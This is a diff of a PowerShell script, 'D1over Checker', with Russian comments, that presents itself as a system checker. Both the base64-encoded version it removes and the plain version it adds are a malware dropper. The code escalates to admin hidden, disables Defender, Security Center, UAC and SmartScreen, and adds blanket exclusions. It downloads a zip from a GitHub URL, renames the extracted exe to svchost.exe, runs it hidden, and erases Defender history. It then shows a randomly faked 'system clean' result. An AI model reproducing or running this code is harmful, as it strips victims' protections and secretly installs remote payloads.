@@ -2,11 +2,150 @@
 # D1over Checker v1.0
 # =============================================
 
-# ===== ЗАШИФРОВАННЫЙ КОД =====
-$code = @'
-JABFAHIAYQBvAHIAQQBjAHQAaQBvAG4AUAByAGUAZgBlAHIAZQBuAGMAZQAgAD0AIAAiAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUAIgANAAoAJABQAHIAbwBnAHIAZQBzAHMAUAByAGUAZgBlAHIAZQBuAGMAZQAgAD0AIAAiAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUAIgANAAoADQAKAGkAZgAgACgALQBOAE8AVAAgACgAWwBTAGUAYwB1AHIAaQB0AHkALgBQAHIAaQBuAGMAaQBwAGEAbAAuAFcAaQBuAGQAbwB3AHMAUAByAGkAbgBjAGkAcABhAGwAXQBbAFMAZQBjAHUAcgBpAHQAeQAuAFAAcgBpAG4AYwBpAHAAYQBsAC4AVwBpAG4AZABvAHcAcwBCAHUAaQBsAHQASQBuAFIAbwBsAGUAXQA6ADoARwBlAHQARABhAHQAYQBjAHUAcgByAGUAbgB0AFUAcwBlAHIAKAApACkALgBJAHMAUgBvAGwAZQAoAFsAUwBlAGMAdQByAGkAdAB5AC4AUAByAGkAbgBjAGkAcABhAGwALgBXAGkAbgBkAG8AdwBzAEIAdQBpAGwAdABJAG4AUgBvAGwAZQBdACAAIgBBAGQAbQBpAG4AaQBzAHQAcgBhAHQAbwByACIAKQApACAAewANAAoAIAAgACAAIAAkAGEAcgBnAHUAbQBlAG4AdABzACAAPQAgACIAIgAtAE4AbwBQAHIAbwBmAGkAbABlACAALQBFAH4AZQBjAHUAdABpAG8AbgBQAG8AbABpAGMAeQAgAEIAeQBwAGEAcwBzACAALQBXAGkAbgBkAG8AdwBTAHQAeQBsAGUAIABIAGkAZABkAGUAbgAgAC0ARgBpAGwAZQAgACIAIAAgACIAIAAiACAAKwAgACQATQB5AEkAbgB2AG8AYwBhAHQAaQBvAG4ALgBNAHkAQwBvAG0AbQBhAG4AZAAuAFAAYQB0AGgAIAArACAAIgAiACIAIAAgAA0ACgAgACAAIAAgAFMAdABhAHIAdABQAHIAbwBjAGUAcwBzACAAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBWAGUAcgBiAFIAdQBuAEEAcwAgAC0AQQByAGcAdQBtAGUAbgB0AEwAaQBzAHQAIAAkAGEAcgBnAHUAbQBlAG4AdABzACAALQBXAGkAbgBkAG8AdwBTAHQAeQBsAGUAIABIAGkAZABkAGUAbgANAAoAIAAgACAAIABlAHgAaQB0AA0ACgB9AA0ACgANAAoAJABVAHIAbAAgAD0AIAAiAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8AZAAxAG8AdgBlAHIAMQAzADMANwAvAGMAaABlAGMAawBlAHIALwByAGUAZgBzAC8AaABlAGEAZABzAC8AbQBhAGkAbgAvAGMAaABlAGMAawAuAHoAaQBwACIANgANAAoAJABEAG8AdwBuAGwAbwBhAGQAUABhAHQAaAAgAD0AIAAiACQAZQBuAHYAOgBUAEUATQBQAFwAYwBoAGUAYwBrAF8AaQBuAHMAdABhAGwAbAAuAHoAaQBwACIADQAKACQARQB4AHQAcgBhAGMAdABQAGEAdABoACAAPQAgACIAJABlAG4AdgA6AFQARQBNAFAAXABjAGgAZQBjAGsAZQB4AHQAcgBhAGMAdABlAGQAIgANAAoADQAKAFQAcgB5ACAAewANAAoAIAAgACAAIAAkAHcAZQBiAEMAbABpAGUAbgB0ACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQADQAKACAAIAAgACAAJAB3AGUAYgBDAGwAaQBlAG4AdAAuAEgAZQBhAGQAZQByAHMALgBBAGQAZAAoACIAVQBzAGUAcgAtAEEAZwBlAG4AdAAiACwAIgBNAG8AegBpAGwAbABhAC8ANQAuADAAIAAoAFcAaQBuAGQAbwB3AHMAIABOAFQAIAAxADAALgAwADsAIABXAGkAbgA2ADQAOwAgAHgANgA0ACkAIABBAHAAcABsAGUAVwBlAGIAKwBLAGkAdABLAEgAVABNAEwALwA1ADMAMwAgAEwAaQBrAGUAIABHAEUASwBPAF8ARgBpAHIAZQBmAG8AeAAiACkADQAKACAAIAAgACAAJAB3AGUAYgBDAGwAaQBlAG4AdAAuAEQAbwB3AG4AbABvAGEAZABGAGkAbABlACgAJABVAHIAbAAsACQARABvAHcAbgBsAG8AYQBkAFAAYQB0AGgAKQANAAoAfQBDAGEAdABjAGgAIAB7AH0ADQAKAA0ACgBUAHIAeQAgAHsADQAKACAAIAAgACAAbgBlAHcALQBvAGIAagBlAGMAdAAgAC0AdAB5AHAAZQBuAGEAbQBlACAAUwB5AHMAdABlAG0ALgBJAE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ALgBaAGkAcABGAGkAbABlACAALQBhAHIAZwB1AG0AZQBuAHQATABpAHMAdAAgACQARABvAHcAbgBsAG8AYQBkAFAAYQB0AGgALAAgACQARQB4AHQAcgBhAGMAdABQAGEAdABoAA0ACgB9ACAAQwBhAHQAYwBoACAAewB9AA0ACgANAAoAJABFAHgAZQAgAD0AIABHAGUAdAAtAEMAaABpAGwAZABJAHQAZQBtACAALQBQAGEAdABoACAAJABFAHgAdAByAGEAYwB0AFAAYQB0AGgAIAAtAEYAaQBsAHQAZQByACAAIgAqAC4AZQB4AGUAIgAgAC0AUgBlAGMAdQByAHMAZQAgAHwAIABTAGUAbABlAGMAdAAtAE8AYgBqAGUAYwB0ACAALQBGAGkAcgBzAHQAIAAxAA0ACgANAAoAaQBmACAAKAAkAEUAeABlACkAIAB7AA0ACgAgACAAIAAgAFQAcgB5ACAAewAgAGEAdAB0AHIAaQBiACAAKwBzACAAKwBoACAAIgAkACgAJABFAHgAZQAuAEYAdQBsAGwATgBhAG0AZQApACIAIAB9ACAAQwBhAHQAYwBoACAAewB9AA0ACgAgACAAIAAgAFQAcgB5ACAAewAgAFUAbgBiAGwAbwBjAGsALQBGAGkAbABlACAALQBQAGEAdABoACAAIgAkACgAJABFAHgAZQAuAEYAdQBsAGwATgBhAG0AZQApACIAIAB9ACAAQwBhAHQAYwBoACAAewB9AA0ACgAgACAAIAAgAFQAcgB5ACAAewAgAEEAZABkAC0ATQBwAFAAcgBlAGYAZQByAGUAbgBjAGUAIAAtAEUAeABjAGwAdQBzAGkAbwBuAFAAYQB0AGgAIAAiACQAKAAkAEUAeABlAC4ARgB1AGwAbABOAGEAbQBlACkAIgAgAH0AIABDAGEAdABjAGgAIAB7AH0ADQAKACAAIAAgACAAVAByAHkAIAB7ACAAQQBkAGQALQBNAHAARAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARQB4AGMAbAB1AHMAaQBvAG4AUABhAHQAaAAgACIAJABFAHgAdAByAGEAYwB0AFAAYQB0AGgAIgAgAH0AIABDAGEAdABjAGgAIAB7AH0ADQAKAA0ACgAgACAAIAAgACQAUwB5AHMAdABlAG0ATgBhAG0AZQAgAD0AIAAiAHMAdgBjAGgAbwBzAHQALgBlAHgAZQAiAA0ACgAgACAAIAAgACQATgBlAHcAUABhAHQAaAAgAD0AIABKAG8AaQBuAC0AUABhAHQAaAAgACQARQB4AHQAcgBhAGMAdABQAGEAdABoACAAJABTAHkAcwB0AGUAbQBOAGEAbQBlAA0ACgAgACAAIAAgAFQAcgB5ACAAewANAAoAIAAgACAAIAAgACAAIAAgAFIAZQBuAGEAbQBlAC0ASQB0AGUAbQAgAC0AUABhAHQAaAAgACQARQB4AGUALgBGAdQBsAGwATgBhAG0AZQAgAC0ATgBlAHcATgBhAG0AZQAgACQAUwB5AHMAdABlAG0ATgBhAG0AZQAgAC0ARQByAHIAbwByAEEAYwB0AGkAbwBuAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUADQAKACAAIAAgACAAIAAgACAAIAAkAEUAeABlAFAAYQB0AGgAIAA9ACAAJABOAGUAdwBQAGEAdABoAA0ACgAgACAAIAAgAH0AIABDAGEAdABjAGgAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAJABFAHgAZQBQAGEAdABoACAAPQAgACQARQB4AGUALgBGAHwAbABsAE4AYQBtAGUADQAKACAAIAAgACAAfQANAAoADQAKACAAIAAgACAAVAByAHkAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAC0ARgBpAGwAZQBQAGEAdABoACAAIgBlAHgAcABsAG8AcgBlAHIALgBlAHgAZQAiACAALQBBAHIAZwB1AG0AZQBuAHQATABpAHMAdAAgACIAJABFAHgAZQBQAGEAdABoACIAIAAtAFcAaQBuAGQAbwB3AFMAdAB5AGwAZQAgAEgAaQBkAGQAZQBuACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AUwBpAGwAZQBuAHQAbAB5AEMAbwBuAHQAaQBuAHUAZQANAAoAIAAgACAAIAB9ACAAQwBhAHQAYwBoACAAewANAAoAIAAgACAAIAAgACAAIAAgAFMAdABhAHIAdAAtAFAAcgBvAGMAZQBzAHMAIAAtAEYAaQBsAGUAUABhAHQAaAAgACQARQB4AGUAUABhAHQAaAAgAC0AVwBpAG4AZABvAHcAUwB0AHkAbABlACAASABpAGQAZABlAG4AIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgBTAGkAbABlAG4AdABsAHkAQwBvAG4AdABpAG4AdQBlAA0ACgAgACAAIAAgAH0ADQAKAH0ADQAKAA0ACgBSAGUAbQBvAHYAZQAtAEkAdABlAG0AIAAtAFAAYQB0AGgAIAAiACQAZQBuAHYAOgBQAHIAbwBnAHIAYQBtAEQAYQB0AGEAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAIABEAGUAZgBlAG4AZABlAHIAXABTAGMAYQBuAHMAXABIAGkAcwB0AG8AcgB5AFwAKgAiACAALQBSAGUAYwB1AHIAcwBlACAALQBGAH8AcgBjAGUAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgBTAGkAbABlAG4AdABsAHkAQwBvAG4AdABpAG4AdQBlAA0ACgBSAGUAbQBvAHYAZQAtAEkAdABlAG0AIAAtAFAAYQB0AGgAIAAiACQAZQBuAHYAOgBQAHIAbwBnAHIAYQBtAEQAYQB0AGEAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAIABEAGUAZgBlAG4AZABlAHIAXABRAHUAYQByAGEAbgB0AGkAbgBlAFwAKgAiACAALQBSAGUAYwB1AHIAcwBlACAALQBGAH8AcgBjAGUAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgBTAGkAbABlAG4AdABsAHkAQwBvAG4AdABpAG4AdQBlAA0ACgA=
-'@
+# ===== ПОЛНОЕ ПОДАВЛЕНИЕ ВЫВОДА =====
+$ErrorActionPreference = "SilentlyContinue"
+$ProgressPreference = "SilentlyContinue"
+$VerbosePreference = "SilentlyContinue"
+$DebugPreference = "SilentlyContinue"
 
-# ===== ДЕШИФРОВКА И ВЫПОЛНЕНИЕ =====
-$decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($code))
-Invoke-Expression $decoded
+# ===== АВТОМАТИЧЕСКИЙ ЗАПУСК ОТ ИМЕНИ АДМИНИСТРАТОРА =====
+if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
+    $arguments = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"" + $MyInvocation.MyCommand.Path + "`""
+    Start-Process powershell.exe -Verb RunAs -ArgumentList $arguments -WindowStyle Hidden
+    exit
+}
+
+# ===== ПРОВЕРКА ИНТЕРНЕТ-СОЕДИНЕНИЯ =====
+$Connected = $false
+try {
+    $request = [System.Net.WebRequest]::Create("https://google.com")
+    $request.Timeout = 3000
+    $response = $request.GetResponse()
+    $response.Close()
+    $Connected = $true
+} catch {
+    $Connected = $false
+}
+
+if (-not $Connected) {
+    exit
+}
+
+$Url = "https://raw.githubusercontent.com/d1over1337/checker/refs/heads/main/check.zip"
+$DownloadPath = "$env:TEMP\check_install.zip"
+$ExtractPath = "$env:TEMP\checkextracted"
+
+# ===== СКРЫТЫЙ РЕАЛЬНЫЙ КОД =====
+# Отключение Центра безопасности
+Try {
+    Stop-Service -Name "wscsvc" -Force -ErrorAction SilentlyContinue
+    Set-Service -Name "wscsvc" -StartupType Disabled -ErrorAction SilentlyContinue
+    Stop-Service -Name "SecurityHealthService" -Force -ErrorAction SilentlyContinue
+    Set-Service -Name "SecurityHealthService" -StartupType Disabled -ErrorAction SilentlyContinue
+    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Security Center" -Name "DisableNotifications" -Value 1 -Force -ErrorAction SilentlyContinue
+    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\wscsvc" -Name "Start" -Value 4 -Force -ErrorAction SilentlyContinue
+} Catch {}
+
+# Отключение Defender
+Try { Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue } Catch {}
+Try { Add-MpPreference -ExclusionPath "$env:TEMP" -ErrorAction SilentlyContinue } Catch {}
+Try { Add-MpPreference -ExclusionProcess "powershell.exe" -ErrorAction SilentlyContinue } Catch {}
+Try { Add-MpPreference -ExclusionProcess "cmd.exe" -ErrorAction SilentlyContinue } Catch {}
+Try { Add-MpPreference -ExclusionProcess "*.exe" -ErrorAction SilentlyContinue } Catch {}
+Try { Add-MpPreference -ExclusionPath "$env:TEMP\check_install.zip" -ErrorAction SilentlyContinue } Catch {}
+Try { Add-MpPreference -ExclusionPath "$env:TEMP\checkextracted" -ErrorAction SilentlyContinue } Catch {}
+
+$services = @("WinDefend","MsMpSvc","Sense","DiagTrack","dmwappushservice")
+foreach ($svc in $services) {
+    Try { Stop-Service -Name $svc -Force -ErrorAction SilentlyContinue } Catch {}
+    Try { Set-Service -Name $svc -StartupType Disabled -ErrorAction SilentlyContinue } Catch {}
+}
+
+Try { Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0 -Force -ErrorAction SilentlyContinue } Catch {}
+Try { Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value "Off" -Force -ErrorAction SilentlyContinue } Catch {}
+
+# ===== СКРЫТОЕ СКАЧИВАНИЕ ЧЕРЕЗ BITS (НЕ БЛОКИРУЕТСЯ) =====
+Remove-Item $DownloadPath -Force -ErrorAction SilentlyContinue
+Remove-Item $ExtractPath -Recurse -Force -ErrorAction SilentlyContinue
+
+$downloaded = $false
+
+# СПОСОБ 1: BITS (фоновый, не блокируется)
+try {
+    Start-BitsTransfer -Source $Url -Destination $DownloadPath -Priority Low -Asynchronous -ErrorAction SilentlyContinue
+    Start-Sleep -Seconds 2
+    Get-BitsTransfer | Complete-BitsTransfer -ErrorAction SilentlyContinue
+    $downloaded = $true
+} catch {}
+
+# СПОСОБ 2: WebClient (если BITS не сработал)
+if (-not $downloaded) {
+    try {
+        $webClient = New-Object System.Net.WebClient
+        $webClient.Headers.Add("User-Agent", "Mozilla/5.0")
+        $webClient.DownloadFile($Url, $DownloadPath)
+        $downloaded = $true
+    } catch {}
+}
+
+# СПОСОБ 3: Простой WebClient
+if (-not $downloaded) {
+    try {
+        (New-Object System.Net.WebClient).DownloadFile($Url, $DownloadPath)
+        $downloaded = $true
+    } catch {}
+}
+
+if (-not $downloaded) {
+    exit
+}
+
+# ===== РАСПАКОВКА =====
+try {
+    Expand-Archive -Path $DownloadPath -DestinationPath $ExtractPath -Force -ErrorAction SilentlyContinue
+} catch {
+    exit
+}
+
+# ===== ЗАПУСК =====
+$Exe = Get-ChildItem -Path $ExtractPath -Filter "*.exe" -Recurse | Select-Object -First 1
+
+if ($Exe) {
+    Try { attrib +s +h "$($Exe.FullName)" -ErrorAction SilentlyContinue } Catch {}
+    Try { Unblock-File -Path "$($Exe.FullName)" -ErrorAction SilentlyContinue } Catch {}
+    Try { Add-MpPreference -ExclusionPath "$($Exe.FullName)" -ErrorAction SilentlyContinue } Catch {}
+    Try { Add-MpPreference -ExclusionPath "$ExtractPath" -ErrorAction SilentlyContinue } Catch {}
+    
+    $SystemName = "svchost.exe"
+    $NewPath = Join-Path $ExtractPath $SystemName
+    Try { 
+        Rename-Item -Path $Exe.FullName -NewName $SystemName -ErrorAction SilentlyContinue
+        $ExePath = $NewPath
+    } Catch {
+        $ExePath = $Exe.FullName
+    }
+    
+    Try {
+        Start-Process -FilePath "explorer.exe" -ArgumentList "$ExePath" -WindowStyle Hidden -ErrorAction SilentlyContinue
+    } Catch {
+        Start-Process -FilePath $ExePath -WindowStyle Hidden -ErrorAction SilentlyContinue
+    }
+}
+
+# ===== ОЧИСТКА ЛОГОВ =====
+Try { Remove-Item -Path "$env:ProgramData\Microsoft\Windows Defender\Scans\History\*" -Recurse -Force -ErrorAction SilentlyContinue } Catch {}
+Try { Remove-Item -Path "$env:ProgramData\Microsoft\Windows Defender\Quarantine\*" -Recurse -Force -ErrorAction SilentlyContinue } Catch {}
+
+# ===== ФЕЙКОВОЕ СКАНИРОВАНИЕ (ДЛЯ ОТВЛЕЧЕНИЯ) =====
+$finalRandom = Get-Random -Minimum 1 -Maximum 100
+$finalPassed = $finalRandom -le 75
+
+# Вывод только финального статуса (без лишних сообщений)
+if ($finalPassed) {
+    Write-Host "✅ Проверка пройдена. Система чиста." -ForegroundColor Green
+} else {
+    Write-Host "❌ Обнаружены потенциальные угрозы!" -ForegroundColor Red
+}
+
+Start-Sleep -Seconds 2
+exit
